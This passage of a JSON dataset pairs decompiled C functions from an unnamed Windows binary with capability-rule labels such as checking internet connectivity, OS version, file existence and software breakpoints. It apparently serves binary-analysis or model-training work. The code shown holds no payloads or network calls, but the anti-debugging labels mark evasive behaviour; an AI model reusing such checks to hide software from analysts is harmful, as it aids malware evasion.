        "decompiled_code": "\nuint __cdecl fcn.00078460(int32_t *arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    if (*arg_8h == 1) {\n        if (*(arg_8h + 6) == 2) {\n            *arg_ch = 2;\n            *arg_ch = 0;\n            arg_ch[1] = 0;\n            arg_ch[2] = 0;\n            arg_ch[3] = 0;\n            arg_ch[1] = *(arg_8h + 10);\n            *(arg_ch + 2) = *(arg_8h + 2);\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = 0xc0000001;\n        }\n    }\n    else {\n        uVar1 = 0xc0000001;\n    }\n    return uVar1;\n}\n",
        "token_count": 200
    },
    "00078510": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00078510(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, uint arg_18h)\n\n{\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    \n    fcn.000789c0(&var_10h, arg_8h);\n    var_2ch = 0x18;\n    var_28h = 0;\n    var_20h = 0x40;\n    var_24h = &var_10h;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = fcn.0001f080(arg_14h, 0xc0000000, &var_2ch, &var_8h, 0, 0x80, 3, 3, 0, arg_10h, arg_ch);\n    if ((var_14h == 0) && (var_14h = (**0x8005129c)(*arg_14h, 0xc0000000, 0, 0, arg_18h, 0),  var_14h != 0)) {\n        fcn.000789b4(*arg_14h);\n        *arg_14h = 0;\n    }\n    return var_14h;\n}\n",
        "token_count": 347
    },
    "00078760": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00078760(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_10h_00;\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = fcn.000356c0(0x21);\n    if (arg_10h_00 == 0) {\n        uVar1 = 0xc000009a;\n    }\n    else {\n        fcn.00078bfa(arg_10h_00, 0, 0x21);\n        *(arg_10h_00 + 5) = 0x11;\n        *(arg_10h_00 + 8) = *0x800556c0;\n        *(arg_10h_00 + 0xc) = *0x800556c4;\n        *(arg_10h_00 + 0x10) = *0x800556c8;\n        *(arg_10h_00 + 0x14) = *0x800556cc;\n        *(arg_10h_00 + 0x18) = *0x800556d0;\n        *(arg_10h_00 + 6) = 4;\n        uVar1 = fcn.00078510(arg_8h, 0x21, arg_10h_00, arg_ch, arg_10h);\n        fcn.000357f0(arg_10h_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 343
    },
    "00078810": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00078810(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t arg_10h_00;\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = arg_10h + 0x1c;\n    arg_10h_00 = fcn.000356c0(arg_8h_00);\n    if (arg_10h_00 == 0) {\n        uVar1 = 0xc000009a;\n    }\n    else {\n        fcn.00078bfa(arg_10h_00, 0, arg_8h_00);\n        *(arg_10h_00 + 5) = 0x10;\n        *(arg_10h_00 + 8) = *0x800556ac;\n        *(arg_10h_00 + 0xc) = *0x800556b0;\n        *(arg_10h_00 + 0x10) = *0x800556b4;\n        *(arg_10h_00 + 0x14) = *0x800556b8;\n        *(arg_10h_00 + 0x18) = *0x800556bc;\n        *(arg_10h_00 + 6) = arg_10h;\n        fcn.00078be8(arg_10h_00 + 0x19, arg_ch, arg_10h);\n        uVar1 = fcn.00078510(arg_8h, arg_8h_00, arg_10h_00, arg_14h, arg_18h);\n        fcn.000357f0(arg_10h_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 424
    },
    "0008aa98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0008ab60)\n\nvoid __cdecl fcn.0008aa98(code **arg_8h)\n\n{\n    code *pcVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    *(arg_8h + 0xe) = 1;\n    if (*(arg_8h + 0xd) == '\\0') {\n        if (*(arg_8h + 99) == 0) {\n            pcVar1 = (**arg_8h)(*(arg_8h + 0x67), *(arg_8h + 0x6f));\n            arg_8h[2] = pcVar1;\n        }\n        else {\n            pcVar1 = (**arg_8h)(*(arg_8h + 0x67), *(arg_8h + 0x6f), 0);\n            arg_8h[2] = pcVar1;\n            if (*(arg_8h + 0x6f) == 0) {\n                (**(arg_8h + 0x9f))(*(arg_8h + 0xf), 0, 0xffff, &var_4h);\n            }\n        }\n    }\n    if (*(arg_8h + 0x77) != 1) {\n        (**(arg_8h + 0x87))(*(arg_8h + 0x7f), 0);\n        (**(arg_8h + 0x8f))(*(arg_8h + 0x7f));\n        *(arg_8h + 0x7b) = 1;\n        return;\n    }\n    if ((*(arg_8h + 0x97) | *(arg_8h + 0x9b)) != 0) {\n        (**(arg_8h + 0x97))(0xfffffffe, arg_8h[2]);\n    }\n    do {\n    // WARNING: Do nothing block with infinite loop\n    } while( true );\n}\n",
        "token_count": 442
    },
    "00037640": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00037640(uint arg_8h, uint8_t *arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = (**0x80051004)();\n    *arg_ch = uVar1;\n    if (*arg_ch < 2) {\n        (**0x80051000)();\n    }\n    fcn.00037470(arg_8h, arg_10h);\n    return;\n}\n",
        "token_count": 101
    },
    "00037670": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00037670(uint arg_8h, uint8_t *arg_ch, uint arg_10h)\n\n{\n    fcn.00037550(arg_8h, arg_10h);\n    if (*arg_ch < 2) {\n        (**0x80051008)();\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "000376a0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.000376a0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.00037640(arg_8h, &var_4h, 1);\n    do {\n        iVar1 = fcn.000533b0(arg_8h + 8, 0, 0);\n    } while (iVar1 != 0);\n    fcn.00071080(arg_8h, 0);\n    fcn.00071080(arg_8h + 4, 0);\n    fcn.00071080(arg_8h + 8, 0);\n    if (var_4h < 2) {\n        (**0x80051008)();\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "00061ef0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00061ef0(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x74) == 2) {\n        uVar1 = fcn.000627d0(arg_ch, arg_10h);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 97
    },
    "0006ae50": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0006ae50(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    fcn.00034a10(arg_8h + 0x130);\n    for (var_4h = 0; var_4h < 2; var_4h = var_4h + 1) {\n        iVar1 = fcn.0001ace0(arg_8h + 0x2c + var_4h * 0x18, 0x800ab2e0, arg_8h + 0x28 + var_4h * 0x18);\n        if (iVar1 == 0) {\n            *(arg_8h + 0x28 + var_4h * 0x18) = 1;\n        }\n        else {\n            *(arg_8h + 0x28 + var_4h * 0x18) = 3;\n            var_8h = var_8h + 1;\n        }\n    }\n    fcn.00034a80(arg_8h + 0x130);\n    if (var_8h == 2) {\n        uVar2 = 0x21590007;\n    }\n    else {\n        *(arg_8h + 0x1c) = arg_ch;\n        *(arg_8h + 0x20) = arg_10h;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 399
    },
    "0006b000": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006b000(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint uVar1;\n    \n    if ((arg_ch == 2) && (arg_14h == 0xc)) {\n        fcn.00078be8(arg_8h + 0x134, arg_10h, 0xc);\n        uVar1 = 0;\n    }\n    else if (arg_ch == 5) {\n        *(arg_8h + 0x140) = arg_10h;\n        uVar1 = 0;\n    }\n    else if (arg_ch == 0xb) {\n        *(arg_8h + 0x144) = arg_10h;\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 0x21590001;\n    }\n    return uVar1;\n}\n",
        "token_count": 208
    },
    "0004c260": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0004c260(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = fcn.00037c60(arg_8h, arg_ch, &var_8h);\n    if ((iVar1 != 0) && (var_8h == *0x800b945c)) {\n        if (var_4h == 0xc001ba5e) {\n            return 1;\n        }\n        if (var_4h < 4) {\n            return var_4h + 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 156
    },
    "00072e20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00072e20(uint noname_0, unkuint3 *arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t in_ECX;\n    uint32_t var_4h;\n    \n    if (arg_10h < 3) {\n        uVar1 = 0;\n    }\n    else {\n        var_4h = in_ECX & 0xff000000 | *arg_ch;\n        fcn.00072270(&var_4h);\n        if ((var_4h & 0x4000) == 0) {\n            if (((var_4h & 0x100) == 0) || ((var_4h & 0x400) != 0)) {\n                uVar1 = 0;\n            }\n            else {\n                uVar1 = 1;\n            }\n        }\n        else {\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 215
    },
    "0001f190": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0001f190(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    code *pcVar2;\n    uint arg_ch_00;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    if (((arg_ch != -1) && (arg_ch != -2)) && (iVar1 = fcn.00034f60(arg_ch, &var_4h),  iVar1 == 0)) {\n        iVar1 = (**0x8005129c)(var_4h, 0, **0x80051108, 0, &var_8h, 0);\n        if (iVar1 == 0) {\n            if ((((*(var_8h + 0x2c) & 0x400000) != 0) && (iVar1 = fcn.00017590(*(var_8h + 4)),  iVar1 != 0)) &&\n               (iVar1 = fcn.0005a620(),  iVar1 != *(*0x800cc770 + 0x14))) {\n                arg_ch_00 = 0;\n                arg_8h_00 = fcn.0005a620();\n                fcn.0001ffe0(arg_8h_00, arg_ch_00);\n            }\n            (**0x800512e0)();\n        }\n        fcn.00034fb0(arg_ch, var_4h);\n    }\n    pcVar2 = fcn.00063f30(arg_8h);\n    (*pcVar2)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch);\n    return;\n}\n",
        "token_count": 460
    },
    "0001ffe0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001ffe0(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    fcn.00037640(0x800ce65c, &var_4h, 1);\n    for (var_8h = 0; (var_8h < *0x800ce668 && (*(*0x800ce66c + var_8h * 8) != arg_8h)); var_8h = var_8h + 1) {\n    }\n    if ((*0x800ce668 <= var_8h) &&\n       (iVar1 = fcn.00035720(0x800ce66c, *0x800ce668 << 3, *0x800ce668 * 8 + 8),  iVar1 != -1)) {\n        *(*0x800ce66c + *0x800ce668 * 8) = arg_8h;\n        *(*0x800ce66c + 4 + *0x800ce668 * 8) = arg_ch;\n        *0x800ce668 = *0x800ce668 + 1;\n    }\n    fcn.00037670(0x800ce65c, &var_4h, 1);\n    return;\n}\n",
        "token_count": 299
    },
    "000238b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000238b0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    \n    if (*0x800cc664 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00022a60(*0x800cc664, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 135
    },
    "000238f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000238f0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    \n    if (*0x800cc664 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00022790(*0x800cc664, arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return uVar1;\n}\n",
        "token_count": 112
    },
    "00023930": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023930(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    \n    if (*0x800cc664 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.000226b0(*0x800cc664, arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return uVar1;\n}\n",
        "token_count": 112
    },
    "00023970": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023970(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    \n    if (*0x800cc664 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.000225f0(*0x800cc664, arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return uVar1;\n}\n",
        "token_count": 112
    },
    "000239b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000239b0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    \n    if (*0x800cc664 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00022430(*0x800cc664, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 134
    },
    "000239f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000239f0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    \n    if (*0x800cc664 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.000222d0(*0x800cc664, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 135
    },
    "00023a30": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00023a30(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    \n    if (*0x800cc664 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.000221a0(*0x800cc664, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    return uVar1;\n}\n",
        "token_count": 146
    },
    "00023a80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023a80(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    if (*0x800cc664 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021e60(*0x800cc664, arg_8h, arg_ch, arg_10h);\n    }\n    return uVar1;\n}\n",
        "token_count": 102
    },
    "00023ab0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023ab0(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    \n    if (*0x800cc664 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021f10(*0x800cc664, arg_8h, arg_ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 91
    },
    "00023ae0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023ae0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    if (*0x800cc664 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00022040(*0x800cc664, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return uVar1;\n}\n",
        "token_count": 123
    },
    "00023b20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023b20(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    if (*0x800cc664 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021c90(*0x800cc664, arg_8h, arg_ch, arg_10h);\n    }\n    return uVar1;\n}\n",
        "token_count": 102
    },
    "00023b50": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023b50(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    if (*0x800cc664 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00021d70(*0x800cc664, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return uVar1;\n}\n",
        "token_count": 124
    },
    "00023ca0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023ca0(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    \n    if (*0x800cc664 == -1) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = fcn.00022b20(*0x800cc664, arg_8h, arg_ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 91
    },
    "00034f60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00034f60(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint uVar1;\n    \n    if ((((arg_8h & 0x80000000) == 0x80000000) && (arg_8h != 0xfffffffe)) && (arg_8h != 0xffffffff)) {\n        *arg_ch = arg_8h;\n        *arg_ch = arg_8h;\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00078b22(0xffffffff, arg_8h, 0xffffffff, arg_ch, 0, 0x200, 2);\n    }\n    return uVar1;\n}\n",
        "token_count": 162
    },
    "000360e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000360e0(uint arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    \n    *arg_ch = 0;\n    arg_ch[1] = 0;\n    arg_ch[2] = 0;\n    arg_ch[3] = 0;\n    arg_ch[4] = 0;\n    arg_ch[5] = 0;\n    arg_ch[6] = 0;\n    arg_ch[7] = 0;\n    arg_ch[8] = 0;\n    uVar1 = fcn.00035df0(arg_8h);\n    arg_ch[5] = uVar1;\n    if (arg_ch[5] == -1) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 190
    },
    "00036130": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00036130(uint arg_8h, uint *arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00035fa0(arg_8h, 0);\n    if (arg_8h_00 == -1) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        *arg_ch = 0;\n        arg_ch[1] = 0;\n        arg_ch[2] = 0;\n        arg_ch[3] = 0;\n        arg_ch[4] = 0;\n        arg_ch[5] = 0;\n        arg_ch[6] = 0;\n        arg_ch[7] = 0;\n        arg_ch[8] = 0;\n        uVar1 = fcn.00035df0(arg_8h_00);\n        arg_ch[5] = uVar1;\n        fcn.00036000(arg_8h_00);\n        if (arg_ch[5] == -1) {\n            uVar1 = 0xffffffff;\n        }\n        else {\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 276
    },
    "00051650": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00051650(int32_t arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, int32_t arg_18h, uint arg_1ch, int32_t arg_20h, \n            int32_t arg_24h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    code *var_4h;\n    \n    if (*0x800b93bc != -1) {\n        var_8h = *(arg_8h + *0x800b93bc);\n        var_4h = *(var_8h + 0x174);\n        if (arg_20h == arg_24h) {\n            iVar3 = fcn.00048310(var_8h, 0, arg_14h, arg_18h, arg_1ch, arg_24h, 0);\n            if (iVar3 != 0) {\n                (*var_4h)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h);\n            }\n        }\n        else {\n            iVar3 = fcn.00048310(var_8h, 0, arg_14h, arg_18h, arg_1ch, arg_20h, 1);\n            if (iVar3 == 0) {\n                if (arg_18h == 0xe) {\n                    var_ch = arg_14h;\n                    iVar1 = *(arg_14h + 3);\n                    iVar2 = fcn.00035980(0x800);\n                    if (iVar1 == iVar2) {\n                        var_1ch = *var_ch;\n                        var_18h = var_ch[1];\n                        var_14h = var_ch[2];\n                        var_10h._0_2_ = *(var_ch + 3);\n                        var_10h._0_2_ = fcn.00035980(0x7ff);\n                        (*var_4h)(arg_8h, arg_ch, arg_10h, &var_1ch, 0xe, arg_1ch, arg_20h, arg_24h);\n                    }\n                }\n            }\n            else {\n                (*var_4h)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 612
    },
    "00051790": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00051790(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t var_8h;\n    uint var_4h;\n    \n    if (*0x800b93bc == 0xffffffff) {\n        for (var_8h = 0; var_8h < 0x400; var_8h = var_8h + 1) {\n            if (*(arg_8h + var_8h) == arg_ch) {\n                *0x800b93bc = var_8h;\n                break;\n            }\n        }\n        if (*0x800b93bc == 0xffffffff) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 161
    },
    "00060d60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00060d60(code **arg_8h)\n\n{\n    uint32_t var_4h;\n    \n    if (*(arg_8h + 1) == *(arg_8h + 5)) {\n        var_4h = *(arg_8h + 6);\n        if (var_4h == 0) {\n            var_4h = (**arg_8h)(arg_8h);\n            if (var_4h != 0xffffffff) {\n                *(arg_8h + 5) = *(arg_8h + 5) + '\\x01';\n                *(arg_8h + 1) = *(arg_8h + 5);\n                *(arg_8h + *(arg_8h + 5) + 0x112) = var_4h;\n                goto code_r0x00060e01;\n            }\n        }\n        *(arg_8h + 0x40) = 1;\n        *(arg_8h + 6) = 1;\n        var_4h = var_4h & 0xffffff00;\n    }\n    else {\n        *(arg_8h + 1) = *(arg_8h + 1) + '\\x01';\n        var_4h = *(arg_8h + *(arg_8h + 1) + 0x112);\ncode_r0x00060e01:\n        *(arg_8h + *(arg_8h + 3) + 0x212) = var_4h;\n        *(arg_8h + 3) = *(arg_8h + 3) + '\\x01';\n        var_4h = arg_8h & 0xffffff00 | var_4h & 0xff;\n    }\n    return var_4h;\n}\n",
        "token_count": 408
    },
    "000785d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
